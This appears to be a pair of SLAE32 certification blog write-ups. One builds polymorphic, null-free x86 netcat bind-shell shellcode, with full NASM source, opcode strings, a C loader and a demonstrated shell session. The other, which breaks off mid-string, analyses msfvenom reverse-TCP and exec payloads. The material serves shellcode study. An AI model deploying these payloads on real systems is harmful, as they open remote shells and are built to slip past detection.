~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/cat_passwd-shellcode-571 ‹main●› ╰─$ ./shellcode Shellcode Length: 61 root:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin dnsmasq:x:105:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:107:113:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:108:117:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:109:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:110:119:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:111:120::/var/lib/saned:/usr/sbin/nologin colord:x:112:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false lightdm:x:114:122:Light Display Manager:/var/lib/lightdm:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin edu:x:1000:1000:edu:/home/edu:/usr/bin/zsh Size: 61 bytes\nIncreased 41,9% which reflects in more 17 bytes.\nShellcode 3 - nc -lvve/bin/sh -p13377 Sharing some thoughts This was by far the most challenging exercise I had during the course\nAt some point, I turned it into a personal thing because I decided to put the techniques I learned from the msfvenom shellcode analysis assignment into this exercise, and nothing seemed to work.\nOne constraint I needed to bypass was that I generated the msfvenoom shellcodes with null bytes.\nI couldn’t use null bytes this time, so I needed to review how msfvenom generated shellcode without null bytes and tried to apply that methodology to this task.\nThis way, I will present two polymorphic versions of this shellcode: one with null bytes and another with null-free shellcode.\nThen, we can compare the differences between them and reflect how hard is to develop a null-free shellcode.\nThe following quote tells the mindset we should have not to give up when we face a complex problem and resumes how difficult it was for me to make it work.\nIntelligence is the ability to adapt to change, by Stephen Hawking After this, let\u0026rsquo;s get to the point.\nThis shellcode was written by an Anonymous user, and is located here. As the shellcode description says, this shellcode will listen on port 13377 using netcat and give /bin/sh to the connecting attacker.\nThe original shellcode does not have any comments, so I added some to be easier to understand its internals.\nSize: 62 bytes\nlinux x86 nc -lvve/bin/sh -p13377 shellcode This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker Author: Anonymous Site: http://chaossecurity.wordpress.com/ Here is code written in NASM ///////////////////////////// section .text global _start _start: xor eax,eax xor edx,edx push 0x37373333\t; 7733 push 0x3170762d\t; 1pv- mov edx, esp push eax push 0x68732f6e\t; hs/n push 0x69622f65\t; ib/e push 0x76766c2d\t; vvl- mov ecx,esp push eax push 0x636e2f2f\t; cn// push 0x2f2f2f2f\t; //// push 0x6e69622f\t; nib/ mov ebx, esp push eax push edx push ecx push ebx xor edx,edx mov ecx,esp mov al,11\t; execve syscall int 0x80 ////////////////////////////////// And here is objdump from which you can see the shellcode ////////////////////////////////// teo@teo-desktop ~ $ objdump -d a.out a.out: file format elf32-i386 Disassembly of section .text: 08048060 \u0026lt;.text\u0026gt;: 8048060: 31 c0 xor %eax,%eax 8048062: 31 d2 xor %edx,%edx 8048064: 68 33 33 37 37 push $0x37373333 8048069: 68 2d 76 70 31 push $0x3170762d 804806e: 89 e2 mov %esp,%edx 8048070: 50 push %eax 8048071: 68 6e 2f 73 68 push $0x68732f6e 8048076: 68 65 2f 62 69 push $0x69622f65 804807b: 68 2d 6c 76 76 push $0x76766c2d 8048080: 89 e1 mov %esp,%ecx 8048082: 50 push %eax 8048083: 68 2f 2f 6e 63 push $0x636e2f2f 8048088: 68 2f 2f 2f 2f push $0x2f2f2f2f 804808d: 68 2f 62 69 6e push $0x6e69622f 8048092: 89 e3 mov %esp,%ebx 8048094: 50 push %eax 8048095: 52 push %edx 8048096: 51 push %ecx 8048097: 53 push %ebx 8048098: 31 d2 xor %edx,%edx 804809a: 89 e1 mov %esp,%ecx 804809c: b0 0b mov $0xb,%al 804809e: cd 80 int $0x80 As I said above, I had a completely different approach than others for this exercise.\nThe inspiration was the methodology used by the previously analyzed msfvenom shellcodes.\nI will first present the shellcode with null bytes.\nNull Byte Shellcode xor eax, eax cdq call $+ 0xf sub eax,0x33317076 xor esi,DWORD [edi] aaa add byte [eax], al pop edx call $ + 0x13 sub eax,0x6576766c das bound ebp, [ecx+0x6e] das jae $+0x6a add byte [eax], al pop ecx call $ + 0x12 das bound ebp, [ecx+0x6e] das das das das das das outsb arpl word [eax],ax pop ebx push eax push edx push ecx push ebx mov eax, 0x454e4a2f ;add ax, 0x1000 xor edx,edx mov ecx,esp and eax,0x3a31358b int 0x80 Let\u0026rsquo;s divide and conquer one more time.\nThe code is divided into parts related to each command argument to be executed by execve.\nA call and a pop instruction delimit each part. The instructions inside this part are used to prepare an argument. The pop $Register instruction is used to put the address pointer of the argument from esp to the related register depending on each argument position of execve we are dealing with.\n4th argument - pop edx 3rd argument - pop ecx 2nd argument - pop ebx 1st argument - pop eax So the pop instruction will tell us what execve argument we were preparing. This exact process is used to prepared the syscall arguments but with obfuscated code.\nFor example:\nxor eax, eax cdq call $+ 0xf\t; Start sub eax,0x33317076 xor esi,DWORD [edi] aaa add byte [eax], al pop edx\t; end call $+0xf tells us we are looking at a “piece” of code that is preparing the 4th argument because the end of this part iss pop edx.\nBetween this instruction, it seems that we have assembly instruction that doesn’t make any sense that will be executed by the CPU but, this is not the case.\nBy this time, you should be familiar with the x86 calling conventions and how call instruction behaves.\nJust a reminder, the call instruction pushes the return address (address immediately after the call instruction) on the stack and changes the eip to the call destination. This effectively transfers control to the call target and begins execution there.\nSo what are these instructions doing exactly? xor eax, eax ; zeroes eax cdq ; zeroes edx (saves space) call $ + 0xf\t; jumps to pop edx sub eax,0x33317076 xor esi,DWORD [edi] aaa add byte [eax], al pop edx ; saving execve 4th argument\tFirstly, we cleareax and edx registers, then we use call the following instruction address and jump to the pop edx instruction.\nWhy $ + 0xf?\nWell, the $ holds the address of the current instruction. As an example, let\u0026rsquo;s use the above code and compare the disassembled output with objdump -M intel -d netcat_nullbyte_shellcode\nxor eax, eax cdq call $+ 0xf ; $ holds address of call opcode sub eax,0x33317076 xor esi,DWORD [edi] aaa add byte [eax], al pop edx --- 08049000 \u0026lt;_start\u0026gt;: 8049000: 31 c0 xor eax,eax 8049002: 99 cdq 8049003: e8 0a 00 00 00 call 8049012 \u0026lt;_start+0x12\u0026gt; 8049008: 2d 76 70 31 33 sub eax,0x33317076 804900d: 33 37 xor esi,DWORD PTR [edi] 804900f: 37 aaa 8049010: 00 00 add BYTE PTR [eax],al 8049012: 5a pop edx Checking the opcodes (2nd column), there is a distance of 15 bytes between pop edx and the call instruction.\nLook how the call instruction introduces null bytes when redirects execution with to an instruction with a short distance.\nSo, we are storing the same bytes in edx as the original shellcode does. Instead of doing push instructions and putting the bytes on the stack.\nApproach 1 - Original shellcode\n; Not forget these are placed in Little-Endian format push 0x37373333 push 0x3170762d Approach 2 - Polymorphic version\nWe place the exact same bytes as opcodes in the code and put the address of the first byte in edx\n2d 76 70 31 33 sub eax,0x33317076 33 77 04 xor esi,DWORD PTR [edi+0x4] 37 aaa 00 40 01 add BYTE PTR [eax+0x1],al Hex bytes: **0x2D, 0x76, 0x70, 0x31, 0x33, 0x33, 0x77, 0x04, 0x37**, 0x00 Comparing both approaches, we see they have the same exact bytes. We can check this with gdb\nApproach 2 has the disadvantage of putting null bytes because we need to specify the end of them, while with approach 1, we push a zeroed register which does have null bytes.\nThis is why I struggled with Approach 2 and why I need to rethink and completely change my approach to avoid null bytes.\nNull-Free Shellcode xor eax,eax mov al, 0x8 fnop jmp short argParser sub eax,0x33317076 xor esi,DWORD [edi] aaa nop ; nops will be changed to nulls in runtime lea edx, [esi+4] mov al, 0xc fnop jmp short argParser sub eax,0x6576766c ; \\xe8\\x0e\\x00\\x00\\x00 das bound ebp, [ecx+0x6e] das jae $+0x6a nop lea ecx, [esi+4] ;call $ + 0x12 ;\\xe8\\x0d\\x00\\x00\\x00 mov al, 0xc fnop jmp short argParser das bound ebp, [ecx+0x6e] das das das das das das outsb arpl word [eax],bx lea ebx, [esi+4] push eax push edx push ecx push ebx cdq ; clear edx because is one of execve\u0026#39;s arguments --\u0026gt; char *const envp[] mov ecx,esp mov al, 0xb int 0x80 argParser: ; similar to jmp-call-pop but calls to a nop byte which can ; assmuming al has the right distance fnstenv [esp-0xc] pop esi mov byte [esi + 0x4 + eax], ah ; null-byte decoder lea edi, [esi + 0x4+eax+0x1] xor eax,eax jmp edi The approach idea is the same as Approach 2 from the Null Byte shellcode, but this one uses the fnstenv technique from the x87 FPU to store the FPU related instruction address instead of using call. This technique was mentioned during the course, but it involved research on our own to understand how we can use it.\nThe logic needed to be completely redesigned to put the shellcode working with this technique.\nThe FNSTENV Technique There are alternative methods in shellcode for finding the value of the EIP register using instructions that contain no null bytes. One of those methods uses an FPU instruction.\nBelow is the image from the FPU section in Intel\u0026rsquo;s manual, that shows how the FPU memory organization.\nWhen the fnstenv instruction is preceded by some other FPU instruction (in our case, it is fnop), then the result of the fnstenv is pushed onto the stack, and the result is none other than the address of the previous FPU instruction.\nFor this exercise, I used fnop instruction. It can be fldz or other FPU-related instruction to use this technique. Just make sure to be an FPU instruction.\nPoC code with fnstenv l1: fnop fnstenv [esp-0c] ; FPU Instruction Pointer (FIP) pop eax l2: ... The result of the above two FPU instructions will be the address of fnop instruction gets saved onto the stack.\nWhen l2 is reached, the value in the eax register will be the address of l1.\nDebugging fnstenv Debugging the code with the fnstenv technique was a complete madness to my head.\nI figured out that performing single-stepping debugging over the fnop instruction results in a completely different value in the eax register. This means that the code could be altered in a very subtle way.\nSo, the solution was to place a breakpoint in fnop and the instruction after the fnstenv. In our code is pop esi\nmov al, 0x8 fnop ; breakpoint here jmp short argParser [...] argParser: fnstenv [esp-0xc] pop esi ; breakpoint here mov byte [esi + 0x4 + eax], ah lea edi, [esi + 0x4+eax+0x1] xor eax,eax jmp edi Between these instructions I executed the program normally to avoid the unstable behaviour fnstenv causes when performing single-step debugging.\nDebug section taken from VirtualPC-specific section in https://www.virusbulletin.com/virusbulletin/2010/11/anti-unpacker-tricks-part-fourteen\nMethodology As well as the previous shellcode, the code is divided into parts related to each argument of the command to be executed by execve.\nEach part is delimited this time by mov, fnop, jmp and lea instructions. The instructions inside this part are used to prepare one of the execve\u0026rsquo;s arguments.\nThe mov, fnop, jmp instructions prepare the environment to store the eip address and the bytes in the related register to the execve argument.\nThe lea $REGISTER, [esi+4] instruction is used to put the address pointer from esp to the related register depending on each argument position of execve we are dealing with.\nSo the lea instruction will tell us what execve argument we were preparing.\nLet\u0026rsquo;s take a \u0026ldquo;piece\u0026rdquo; of code for one of the arguments from our shellcode and dig into it.\nWe\u0026rsquo;ll be analyzing what we put in the edx register.\n; start of edx section argument mov al, 0x8 ; distance from sub to nop fnop ; FPU instruction used to store instruction pointer in FPU stack jmp short argParser sub eax,0x33317076 xor esi,DWORD [edi] aaa nop ; avoid null byte. changed in runtime to null lea edx, [esi+4] ; end of edx section argument ;---------------------------------------- ; starting preparing next argument mov al, 0xc [...] argParser: fnstenv [esp-0xc] ; Storing fnop address onto the stack pop esi ; put stored FIP address in esi mov byte [esi + 0x4 + eax], ah ; null-byte decoder --\u0026gt; change nop to null lea edi, [esi + 0x4+eax+0x1] ; load the address of lea edx, [esi+4] instruction xor eax,eax ; zeroed eax before executing next argument section jmp edi ; jump to instruction lea edx, [esi+4] First, we move to al the distance from the first byte of the argument to be placed in edx to the nop instruction. We don\u0026rsquo;t consider fnop and jmp opcodes because these are always equal across every argument section, so they are considered in the ArgParser branch.\nWe can use objdump to verify that the distance between sub eax,0x33317076, and nop is 8 bytes.\n8049004: d9 d0 fnop 8049006: eb 43 jmp 804904b \u0026lt;argParser\u0026gt; 8049008: 2d 76 70 31 33 sub eax,0x33317076 804900d: 33 37 xor esi,DWORD PTR [edi] 804900f: 37 aaa 8049010: 90 nop 0x8049010 - 0x8049008 = 0x8 bytes Then, we execute an FPU instruction to store the fnop address in the FPU stack. This address will be the reference to our further actions. Next, we jump to the ArgParser branch.\nmov al, 0x8 ; distance from sub to nop fnop ; FPU instruction used to store instruction pointer in FPU stack jmp short argParser In this branch is where all the magic happens.\nargParser: fnstenv [esp-0xc] ; Storing fnop address onto the stack pop esi ; put stored FIP address in esi mov byte [esi + 0x4 + eax], ah ; null-byte decoder --\u0026gt; change nop to null lea edi, [esi + 0x4+eax+0x1] ; load the address of lea edx, [esi+4] instruction xor eax,eax ; zeroed eax before executing next argument section jmp edi ; jump to instruction lea edx, [esi+4] First, we store the fnop address on the stack and put that address in the esi register.\nThen, remember that nop (0x90) byte we put at the end of the section argument?\nWe need to put a null byte in the end, but we can\u0026rsquo;t put it explicitly. So we are going to change it to a null byte with the following single instruction\nmov byte [esi + 0x4 + eax], ah ; ah is always zero Basically, we are moving ah, which is the ax eight most significant bits register to the address of the nop byte. We know that ah is always null because at the beginning of the shellcode, we have xor eax, eax, and in the ArgParser branch and we just work with al in each argument section. So, ah byte is not touched during our operations.\nThis way, a null byte is placed in the argument bytes marking the end of the string bytes.\nLet\u0026rsquo;s demonstrate it in gdb.\nAfter changing 0x90 to 0x00, three new instructions appeared.\nThat null byte changed also the fnstenv instruction.\nWhat a simple thing can do, right?\nAfter performing this operation we need to store the argument address in edx. Basically, we need to jump to the lea edx, [esi+4] instruction.\nThe way our code is doing this is by loading to edi the lea address based on the esi register which holds the fnop instruction address, adding the distance from fnop to esi which was the former nop byte, and adding 1 more byte to reach lea edx, [esi+4] from the fnop instruction.\nlea edi, [esi + 0x4+eax+0x1] ; load the address of lea edx, [esi+4] instruction The most tricky is done, we just need to clear eax to prepare the next argument section and jump to put the argument address in edx using edi.\nxor eax,eax ; zeroed eax before executing next argument section jmp edi ; jump to instruction lea edx, [esi+4] Then, it is just doing the same for the other arguments.\nWe end our shellcode calling execve with usual process.\npush eax ; 0x0 push edx ; -vp13377 push ecx ; -lvve/bin/sh push ebx ; /bin//////nc cdq ; clear edx because is one of execve\u0026#39;s arguments --\u0026gt; char *const envp[] mov ecx,esp mov al, 0xb ; execve syscall int 0x80 hecking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/netcat-shellcode-804/poly ‹main●› ╰─$ ../../../../assembler.sh poly_netcat.nasm 150 ↵ [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 92 \u0026#34;\\x31\\xc0\\xb0\\x08\\xd9\\xd0\\xeb\\x43\\x2d\\x76\\x70\\x31\\x33\\x33\\x37\\x37\\x90\\x8d\\x56\\x04\\xb0\\x0c\\xd9\\xd0\\xeb\\x31\\x2d\\x6c\\x76\\x76\\x65\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x90\\x8d\\x4e\\x04\\xb0\\x0c\\xd9\\xd0\\xeb\\x1b\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x2f\\x2f\\x2f\\x2f\\x6e\\x63\\x18\\x8d\\x5e\\x04\\x50\\x52\\x51\\x53\\x99\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\xd9\\x74\\x24\\xf4\\x5e\\x88\\x64\\x06\\x04\\x8d\\x7c\\x30\\x05\\x31\\xc0\\xff\\xe7\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\x31\\xc0\\xb0\\x08\\xd9\\xd0\\xeb\\x43\\x2d\\x76\\x70\\x31\\x33\\x33\\x37\\x37\\x90\\x8d\\x56\\x04\\xb0\\x0c\\xd9\\xd0\u0026#34; \u0026#34;\\xeb\\x31\\x2d\\x6c\\x76\\x76\\x65\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x90\\x8d\\x4e\\x04\\xb0\\x0c\\xd9\\xd0\\xeb\\x1b\u0026#34; \u0026#34;\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x2f\\x2f\\x2f\\x2f\\x6e\\x63\\x18\\x8d\\x5e\\x04\\x50\\x52\\x51\\x53\\x99\\x89\\xe1\\xb0\\x0b\u0026#34; \u0026#34;\\xcd\\x80\\xd9\\x74\\x24\\xf4\\x5e\\x88\\x64\\x06\\x04\\x8d\\x7c\\x30\\x05\\x31\\xc0\\xff\\xe7\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/netcat-shellcode-804/poly ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c shellcode.c:11:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/netcat-shellcode-804/poly ‹main●› ╰─$ ./shellcode Shellcode Length: 92 listening on [any] 13377 ... connect to [127.0.0.1] from localhost [127.0.0.1] 41344 ----------- ╭─edu@debian ~/Desktop/slae_x86/assignments ‹main●› ╰─$ nc -nv 127.0.0.1 13377 (UNKNOWN) [127.0.0.1] 13377 (?) open id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) ls poly_netcat poly_netcat.nasm poly_netcat.o shellcode shellcode.c Size: 92 bytes\nAfter some tuning we have a 92-byte polymorphic shellcode. An increase of 28 bytes in size which corresponds to 43.75%.\nA curious Note After put to work this shellcode I checked how shikata_ga_nai encodes shellcode.\nIt appars to have some similarities to what have done :)\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nNow at: https://www.pentesteracademy.com/course?id=3 Student ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n","permalink":"https://0xnibbles.github.io/posts/slae32/slae_32_assignment_6/","summary":"This post introduces the 6th mission of my SLAE32 journey.\nIf the previous assignment was incredible, this one was even cooler because I could apply what I learned in the Msfvenom analysis assignment to develop polymorphic versions of existing shellcodes.\nSome existing tools, such as ADMutate, will XOR-encrypt the existing shellcode and attach the loader code to it. This is useful, but writing polymorphic shellcodes without a tool is a much better learning experience.","title":"SLAE32 Assignment 6 - Polymorphic Shellcode"},{"content":" This post introduces the 5th mission of my SLAE32 journey.\nAn excellent task to see how a widely used tool by the offensive security community produces shellcode and compare it with my developed ones. New tricks and new cool learned.\nIntroduction The SLAE32 5th assignment purpose is to select 3 msfvenom payloads and document my own analysis of them.\nFor this task I selected the following payloads:\nlinux/x86/shell_reverse_tcp linux/x86/exec linux/x86/chmod Shellcode 1 - linux/x86/shell_reverse_tcp I chose this one to compare the msfvenom shellcode to the code of my first assignment. I was curious to know if I wrote something similar or if there were some tricks I could use to improve my shellcode knowledge.\nThe first step to do is to generate the shellcode using MSF. As usual, let\u0026rsquo;s check its arguments.\nmsfvenom -p linux/x86/exec --list-options\n-[~]$ msfvenom -p linux/x86/shell_reverse_tcp --list-options Options for payload/linux/x86/shell_reverse_tcp: ========================= Name: Linux Command Shell, Reverse TCP Inline Module: payload/linux/x86/shell_reverse_tcp Platform: Linux Arch: x86 Needs Admin: No Total size: 68 Rank: Normal Provided by: Ramon de C Valle \u0026lt;rcvalle@metasploit.com\u0026gt; joev \u0026lt;joev@metasploit.com\u0026gt; Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- CMD /bin/sh yes The command string to execute LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Description: Connect back to attacker and spawn a command shell With this information, we can generate our shellcode\n-[~]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=9001 -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 68 bytes Final size of c file: 311 bytes unsigned char buf[] = \u0026#34;\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\u0026#34; \u0026#34;\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x7f\\x00\\x00\u0026#34; \u0026#34;\\x01\\x68\\x02\\x00\\x23\\x29\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\u0026#34; \u0026#34;\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\u0026#34; \u0026#34;\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34;; Using ndisasm:\necho -ne \u0026#34;\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x7f\\x00\\x00\\x01\\x68\\x02\\x00\\x23\\x29\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34; | ndisasm -u - 00000000 31DB xor ebx,ebx 00000002 F7E3 mul ebx 00000004 53 push ebx 00000005 43 inc ebx 00000006 53 push ebx 00000007 6A02 push byte +0x2 00000009 89E1 mov ecx,esp 0000000B B066 mov al,0x66 0000000D CD80 int 0x80 0000000F 93 xchg eax,ebx 00000010 59 pop ecx 00000011 B03F mov al,0x3f 00000013 CD80 int 0x80 00000015 49 dec ecx 00000016 79F9 jns 0x11 00000018 687F000001 push dword 0x100007f 0000001D 6802002329 push dword 0x29230002 00000022 89E1 mov ecx,esp 00000024 B066 mov al,0x66 00000026 50 push eax 00000027 51 push ecx 00000028 53 push ebx 00000029 B303 mov bl,0x3 0000002B 89E1 mov ecx,esp 0000002D CD80 int 0x80 0000002F 52 push edx 00000030 686E2F7368 push dword 0x68732f6e 00000035 682F2F6269 push dword 0x69622f2f 0000003A 89E3 mov ebx,esp 0000003C 52 push edx 0000003D 53 push ebx 0000003E 89E1 mov ecx,esp 00000040 B00B mov al,0xb 00000042 CD80 int 0x80 Filtering just by the assembly instruction with awk.\nThe output is:\necho -ne \u0026#34;\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x7f\\x00\\x00\\x01\\x68\\x02\\x00\\x23\\x29\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34; | ndisasm -u - | awk \u0026#39;{ print $3,$4,$5 }\u0026#39; xor ebx,ebx mul ebx push ebx inc ebx push ebx push byte +0x2 mov ecx,esp mov al,0x66 int 0x80 xchg eax,ebx pop ecx mov al,0x3f int 0x80 dec ecx jns 0x11 push dword 0x100007f push dword 0x29230002 mov ecx,esp mov al,0x66 push eax push ecx push ebx mov bl,0x3 mov ecx,esp int 0x80 push edx push dword 0x68732f6e push dword 0x69622f2f mov ebx,esp push edx push ebx mov ecx,esp mov al,0xb int 0x80 Looking at the first syscall, we can see the same syscall with value 0x66 or 102 in decimal is passed to eax. This corresponds to the socketcall syscall, as can be seen in the image below.\nThe way socketcall works is by putting an SYS_CALL value in ebx, storing its arguments onto the stack, and pointing ecx to esp, which corresponds to the address where the arguments begin - a different from what was done in the first assignment.\nFrom analyzing the code, using socketcall instead of calling the other four different syscalls seems to be a cleaner and more organized way to achieve the same result.\nLet\u0026rsquo;s separate the shellcode into \u0026ldquo;syscall pieces of code\u0026rdquo; by analyzing each syscall and how the stack was organized.\n1 - Socketcall Syscall with SYS_SOCKET xor ebx,ebx mul ebx push ebx inc ebx push ebx push byte +0x2 mov ecx,esp mov al,0x66 int 0x80 Investigating the man page (man 2 socketcall) shows the structure as int socketcall(int call, unsigned long *args); .\ncall parameter determines which socket function to invoke. args points to a block containing the arguments passed through to the appropriate call.\nLet\u0026rsquo;s check how the shellcode prepares the stack and then invokes socketcall.\nIt starts with the usual register clearing. In this case, used xor ebx, ebx in conjunction with mul ebx to clear eax and edx. The advantage or trick with this approach is to save one line of code.\nAfter that, ebx is pushed onto the stack. At this point, ebx has the value 0 which satisfies the protocol value needed for SYS_SOCKET. just a reminder for SYS_SOCKET structure: socket(PF_INET (2), SOCK_STREAM (1), IPPROTO_IP (0))\nThe same thing we\u0026rsquo;ve done when building our bind shell. This way, pushing ebx the SOCK_STREAM argument is satisfied.\nNext, ebx is incremented ,which refers to the SYS_SOCKET argument we mentioned above. Then, the 0x2 value, which represents PF_INET, is pushed to the stack to complete the task.\nLastly, the address pointed by esp is passed to ecx as it references the arguments we have pushed on the stack. The last instruction (int 0x80) performs the interruption call. If successful, sockfd file descriptor is stored in eax by default.\n2 - dup2() syscall xchg eax,ebx ; storing sockfd file descriptor in ebx pop ecx\t;puts 0x2 in ecx. this is going to be our coutner register mov al,0x3f ; moving dup2() syscall value to al register int 0x80 ; calling dup2() dec ecx ; decrement counter jns 0x11 ; jump near if not sign. Jumps if SF=0 From the code, it calls dup2() instead of connect(), which appears to be a different approach we have performed before.\ndup2() takes sockfd file descriptor created from the SYS_SOCKET interruption call and duplicates 0 (stdin),1 (stdout), and 2 (stderr) file descriptors using the ecx register. This allows us to create an interactive shell.\nThe best part is how it handles the loop with the instruction jns 0x11.\nWhy 0x11?\nndisasm gives the answer.\n00000011 B03F mov al,0x3f 0x11 is a relative address or distance from the first instruction of the entire shellcode. So this will jump to 11 bytes after the first instruction (00000000 31DB xor ebx,ebx) if the loop condition is met.\n3 - socketcall with SYS_CONNECT Checking connect man page is has the following structure -\u0026gt; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);\nint sockfd is stored in ebx The struct structure is 0x100007f (127.0.0.1 - destination IP), 0x2923 (9001 - remote port) and AF_NET (2) push dword 0x100007f\t; pushing 127.0.0.1 remote IP push dword 0x29230002\t; pushing port 9001 and AF_INET mov ecx,esp ; pointing ecx to the top of the stack which where is the struct\u0026#39;s location mov al,0x66 ; moving socketcall() ssycall number to al register push eax push ecx ; push ; sockaddr_in* addr push ebx ; push sockfd mov bl,0x3 ; SYS_CONNECT mov ecx,esp int 0x80 After constructing the sockaddr struct it becames straightforward to call SYS_CONNECT.\n4 - Execve() The execve organization appears to have the same instruction as what has been done in previous assignments. Not a lot of difference should be from it in the MSF shellcode.\npush edx ; pushing a null terminator onto the stack push dword 0x68732f6e\t; pushing \u0026#39;hs//\u0026#39; onto the stack push dword 0x69622f2f\t; pushing \u0026#39;nib/\u0026#39; onto the stack mov ebx,esp ; storing the stack pointer to /bin//sh in ebx push edx ; pushing a null terminator to build another argument push ebx ; the /bin//sh stack pointer address we had stored in ebx mov ecx,esp ; pass to ecx the stack pointer for our arguments mov al,0xb ; execve syscall number int 0x80 Shellcode 2 - linux/x86/exec First, check the required arguments for the exec shellcode with the command.\nmsfvenom -p linux/x86/exec --list-options\n-[~]$ msfvenom -p linux/x86/exec --list-options Options for payload/linux/x86/exec: ========================= Name: Linux Execute Command Module: payload/linux/x86/exec Platform: Linux Arch: x86 Needs Admin: No Total size: 20 Rank: Normal Provided by: vlad902 \u0026lt;vlad902@gmail.com\u0026gt; Geyslan G. Bem \u0026lt;geyslan@gmail.com\u0026gt; Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- CMD no The command string to execute Description: Execute an arbitrary command or just a /bin/sh shell Generating our shellcode with msfvenom\n-[~]$ msfvenom -p linux/x86/exec CMD=whoami -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 42 bytes Final size of c file: 201 bytes unsigned char buf[] = 